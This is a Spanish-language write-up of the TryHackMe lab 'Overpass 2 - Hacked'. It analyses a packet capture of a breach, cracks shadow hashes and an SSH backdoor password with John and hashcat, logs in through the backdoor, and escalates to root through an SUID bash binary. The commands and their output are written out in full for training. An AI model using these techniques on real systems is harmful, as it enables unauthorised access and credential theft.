---
title: Overpass 2 - Hacked Writeup - TryHackMe
date: 2023-06-04
categories: [Writeups, THM]
tags: [Linux, THM, CTF, Easy, Wireshark, Forensic, Hash Cracking]
img_path: /assets/img/commons/overpass_2/
image: overpass_2.png
---

¡Hola!


En este writeup, nos sumergiremos en la máquina [**Overpass 2 - Hacked**](https://tryhackme.com/room/overpass2hacked) de **TryHackMe**, la cual se clasifica como de dificultad fácil en la plataforma. Se trata de una máquina desafiante que proporciona instrucciones sobre qué hacer para resolver el problema, sin profundizar en los detalles de cómo hacerlo. El enfoque planteado es excelente, ya que asumimos el papel de una empresa de pruebas de penetración a la que se le ha solicitado investigar una brecha de seguridad en la que un atacante logró acceder y comprometer el servidor. Nuestro objetivo consiste en revisar los registros, analizar las acciones realizadas y volver a obtener acceso al sistema para recuperar las banderas.

¡Empecemos!

## Tarea 1 Forense - Analizar el PCAP

---

La sala proporciona un archivo `pcapng` al inicio, el cual contiene los paquetes capturados durante el ataque. Para iniciar el análisis del paquete `.pcapng`, procedemos ejecutando **Wireshark**.

```bash
sudo wireshark overpass2.pcapng
```

Continuamos siguiendo el flujo TCP del primer paquete y descubrimos la URL de la página utilizada por los atacantes para cargar su shell inverso.

![pcap1](pcap1.png)

Al examinar el siguiente flujo TCP, podemos observar que el atacante empleó la página `upload.php` para cargar un archivo denominado `payload.php`, el cual contiene su shell inverso.

![pcap2](pcap2.png)

Continuamos inspeccionando y encontramos otro flujo TCP que muestra las acciones realizadas por el atacante una vez que logra obtener una reverse shell en la máquina objetivo. Primero, el atacante verifica qué usuario está utilizando mediante el comando `id`, el cual muestra que se trata del usuario `www-data`. A continuación, utilizan Python para importar el módulo `pty` y generar una shell más interactiva. Luego, enumeran el contenido del directorio actual y examinan el contenido de un archivo oculto llamado `.overpass`.

Posteriormente, el atacante utiliza el comando `su` para cambiar al usuario `james` e ingresa la contraseña, lo que le permite aumentar sus privilegios en la máquina objetivo. Una vez que el atacante ha escalado sus privilegios, navegan al directorio de inicio de James y utilizan el comando `sudo -l` para verificar qué comandos pueden ejecutar con permisos de root. A partir de la salida en la captura de paquetes, observamos que el usuario `james` tiene la capacidad de ejecutar todos los comandos como root utilizando `sudo`.

![pcap3](pcap3.png)

A continuación, el atacante procede a examinar los hashes almacenados en el archivo `/etc/shadow`. Posteriormente, lleva a cabo la clonación de un repositorio de GitHub en la máquina de destino, lo cual le permite crear un backdoor SSH.

![pcap3_1](pcap3_1.png)

Al examinar el archivo shadow, notamos que hay 5 usuarios creados en la máquina de destino. Para determinar cuántas contraseñas pueden ser descifradas, utilizamos la herramienta **John the Ripper** junto con la lista de palabras específica "**fasttrack**". Primero, copiamos las últimas cinco filas del archivo shadow en la captura de red y las guardamos en un nuevo archivo llamado `shadow.txt`. Luego, ejecutamos la herramienta **John the Ripper** para descifrar los hashes.

```bash
❯ john --wordlist=/usr/share/wordlists/fasttrack.txt shadow.txt
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
secret12         (bee)     
abcd123          (szymex)     
1qaz2wsx         (muirland)     
secuirty3        (paradox)     
4g 0:00:00:00 DONE (2023-06-04 17:34) 14.28g/s 792.8p/s 3964c/s 3964C/s Spring2017..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

En la salida obtenida, se observa que se lograron descifrar 4 de los hashes.

## Investigación - Analizar el código

---

En la siguiente etapa de esta sala, procedemos a analizar el código utilizado para la puerta trasera. Para ello, clonamos el repositorio del backdoor y accedemos a él.

```bash
❯ git clone https://github.com/NinjaJc01/ssh-backdoor
Clonando en 'ssh-backdoor'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 18 (delta 4), reused 9 (delta 1), pack-reused 0
Recibiendo objetos: 100% (18/18), 3.14 MiB | 5.05 MiB/s, listo.
Resolviendo deltas: 100% (4/4), listo.
❯ cd ssh-backdoor
```

Dentro del contenido del repositorio descargado desde GitHub, podemos encontrar un archivo denominado `main.go`.

```bash
❯ ls -al
drwxr-xr-x root root 4.0 KB Sun Jun  4 17:37:05 2023  .
drwxr-xr-x root root 4.0 KB Sun Jun  4 17:37:04 2023  ..
drwxr-xr-x root root 4.0 KB Sun Jun  4 17:37:05 2023  .git
.rw-r--r-- root root 6.3 MB Sun Jun  4 17:37:05 2023  backdoor
.rw-r--r-- root root 104 B  Sun Jun  4 17:37:05 2023  build.sh
.rw-r--r-- root root 2.7 KB Sun Jun  4 17:37:05 2023  main.go
.rw-r--r-- root root 109 B  Sun Jun  4 17:37:05 2023  README.md
.rw-r--r-- root root 241 B  Sun Jun  4 17:37:05 2023  setup.sh
```

Al examinar el archivo `main.go`, identificamos en las primeras líneas de código la cadena de hash predeterminada para la puerta trasera.

```bash
var hash string = "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"
```

Continuando con el análisis del código en el archivo `main.go`, al descender por el código, encontramos una función llamada `verifyPass` que acepta tres parámetros, uno de los cuales se llama "`salt`".

```bash
func verifyPass(hash, salt, password string) bool {
	resultHash := hashPassword(password, salt)
	return resultHash == hash
}
```

Al llegar al final del código, nos encontramos con una función llamada `passwordHandler` que realiza una llamada a la función `verifyPass` y le pasa un valor codificado para el parámetro `salt`.

```bash
func passwordHandler(_ ssh.Context, password string) bool {
	return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
}
```

Retomando el análisis del archivo `pcapng` previamente examinado, podemos observar que después de que el atacante clona el repositorio de GitHub y genera un par de claves **RSA**, procede a otorgar permisos de ejecución al archivo de la puerta trasera y lo ejecuta utilizando un hash específico mediante el parámetro `-a`.

![pcap3_2](pcap3_2.png)

Una vez que hemos obtenido el hash, podemos utilizar la herramienta **hashcat** junto con el diccionario **rockyou** para descifrar el hash que recuperamos anteriormente. En el código `main.go` también encontramos la función `hashPassword` que nos confirma que el hash recuperado utilizó el algoritmo **SHA-512**. Además, se indica que el hash **SHA-512** se crea utilizando la contraseña y luego el salt en ese orden (es decir, "**contraseña:salt**").

```bash
func hashPassword(password string, salt string) string {
	hash := sha512.Sum512([]byte(password + salt))
	return fmt.Sprintf("%x", hash)
}
```

Realizamos un filtrado en la ayuda de hashcat y buscamos un modo hash que coincida con la forma en que se creó el hash. Encontramos que el modo hash "**1710**" es adecuado para este caso.

```bash
❯ hashcat --help | grep sha512
   1770 | sha512(utf16le($pass))                                     | Raw Hash
   1710 | sha512($pass.$salt)                                        | Raw Hash salted and/or iterated
```

Para descifrar el hash, proporcionamos el hash **SHA-512** que se encuentra en la captura de paquetes utilizado por el atacante, así como el salt codificado encontrado en el archivo `main.go` (es decir, "**hash:salt**"). Puedes utilizar la siguiente sintaxis de hashcat para descifrar el hash:

```bash
❯ hashcat -m 1710 -a 0 "6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05" /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

[...]

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1710 (sha512($pass.$salt))
Hash.Target......: 6d05358f090eea56a238af02e47d44ee5489d234810ef624028...002a05
Time.Started.....: Sun Jun  4 21:31:53 2023 (0 secs)
Time.Estimated...: Sun Jun  4 21:31:53 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2130.6 kH/s (0.39ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 18432/14344385 (0.13%)
Rejected.........: 0/18432 (0.00%)
Restore.Point....: 16384/14344385 (0.11%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: christal -> tanika
Hardware.Mon.#1..: Util: 32%

Started: Sun Jun  4 21:31:53 2023
Stopped: Sun Jun  4 21:31:55 2023
```

Después de unos segundos, logramos obtener la contraseña en texto plano.

## Ataque - ¡Vuelve a entrar!

---

En la etapa final de esta sala, nuestro objetivo es hackear el servidor utilizando la información previamente capturada y recuperar las banderas de usuario y root.

Para iniciar, procedemos lanzando el comando `ping` desde nuestro equipo atacante para verificar la disponibilidad de la máquina objetivo.

```bash
❯ ping -c 1 10.10.238.4
PING 10.10.238.4 (10.10.238.4) 56(84) bytes of data.
64 bytes from 10.10.238.4: icmp_seq=1 ttl=61 time=342 ms

--- 10.10.238.4 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 341.657/341.657/341.657/0.000 ms
```

Posteriormente, realizamos un escaneo de la máquina de destino utilizando **NMAP**.

```bash
❯ nmap -sV -sC --min-rate 5000 10.10.238.4 -oN services.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 22:05 -05
Nmap scan report for 10.10.238.4
Host is up (0.30s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e43abeedffa702d26ad6d0bb7f385ecb (RSA)
|   256 fc6f22c2134f9c624f90c93a7e77d6d4 (ECDSA)
|_  256 15fd400a6559a9b50e571b230a966305 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LOL Hacked
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|_  2048 a2a6d21879e3b020a24faab6ac2e6bf2 (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.85 seconds
```

El reporte revela que hay tres puertos abiertos en la máquina de destino, uno de los cuales corresponde al backdoor instalado por el atacante, que se encuentra en el puerto `2222`.

Accedemos al sitio web y nos encontramos con una imagen de lo que parece ser un cactus comiendo una galleta, acompañada por el encabezado "**H4ck3d by CooctusClan**".

![web](web.png)

Dado que hemos descifrado previamente la contraseña utilizada por el atacante para el backdoor SSH, ahora podemos acceder directamente al sistema utilizando este protocolo.

```bash
❯ ssh james@10.10.238.4 -p 2222
james@10.10.238.4's password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

james@overpass-production:/home/james/ssh-backdoor$ whoami
james
```

Una vez que hemos accedido al directorio home de James y listado su contenido, nos encontramos con la flag del usuario.

```bash
james@overpass-production:/home/james$ ls -al
total 1136
drwxr-xr-x 7 james james    4096 Jul 22  2020 .
drwxr-xr-x 7 root  root     4096 Jul 21  2020 ..
lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
drwx------ 2 james james    4096 Jul 21  2020 .cache
drwx------ 3 james james    4096 Jul 21  2020 .gnupg
drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
-rw------- 1 james james      51 Jul 21  2020 .overpass
-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
-rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
-rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
drwxrwxr-x 7 james james    4096 Jul 21  2020 www
```

Procedemos a leer la flag.

```bash
james@overpass-production:/home/james$ cat user.txt                            
thm{d119b4fa8c497********************}
```

Además, al explorar el directorio, descubrimos un binario oculto sospechoso con permisos **SUID** y propiedad del usuario root. Al ejecutar este binario, se genera una nueva shell, lo que indica que podría tratarse de una vulnerabilidad de escalada de privilegios que nos permitirá obtener acceso como usuario root.

```bash
james@overpass-production:/home/james$ ./.suid_bash                            
.suid_bash-4.4$ whoami
james
```

Si ejecutamos el binario oculto con el parámetro `-p` para ejecutarlo con los privilegios del propietario, obtendremos una shell con privilegios de root.

```bash
james@overpass-production:/home/james$ ./.suid_bash -p                         
.suid_bash-4.4# whoami
root
```

Finalmente, accedemos al directorio `/root` y leemos la última flag de la máquina.

```bash
.suid_bash-4.4# cd /root
.suid_bash-4.4# ls
root.txt
.suid_bash-4.4# cat root.txt 
thm{d53b2684f1693********************}
```

¡Happy Hacking!
